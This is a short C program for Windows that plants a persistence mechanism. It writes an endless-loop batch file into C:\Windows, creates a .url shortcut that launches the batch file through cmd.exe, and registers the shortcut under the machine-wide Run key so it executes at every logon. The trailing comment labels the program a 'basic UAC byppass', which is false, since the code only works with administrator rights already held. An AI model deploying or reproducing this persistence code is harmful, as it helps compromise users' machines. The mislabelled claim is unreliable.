#include <windows.h>
#include <stdio.h>

int main() {
    const char *batPath = "C:\\Windows\\LotusPersist.bat";
    const char *urlPath = "C:\\Windows\\exploit.url";

    const char *batContent =
        "@echo off\n"
        ":loop\n"
        "ping 8.8.8.8 -n 1 -w 1000 >nul\n"  
        "echo. > C:\\Windows\\System32\\drivers\\etc\\lotus.lock\n"  
        "goto loop\n";

    const char *urlContent =
        "[InternetShortcut]\n"
        "URL=cmd.exe /c C:\\Windows\\LotusPersist.bat\n"
        "IconIndex=0\n"
        "IconFile=C:\\Windows\\System32\\shell32.dll\n";

    FILE *batFile = fopen(batPath, "w");
    if (batFile) {
        fwrite(batContent, sizeof(char), strlen(batContent), batFile);
        fclose(batFile);
    }

    FILE *urlFile = fopen(urlPath, "w");
    if (urlFile) {
        fwrite(urlContent, sizeof(char), strlen(urlContent), urlFile);
        fclose(urlFile);
    }

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Key", 0, REG_SZ,
                       (const BYTE *)urlPath, (DWORD)(strlen(urlPath) + 1));
        RegCloseKey(hKey);
    }

    return 0;
}
//basic UAC byppass
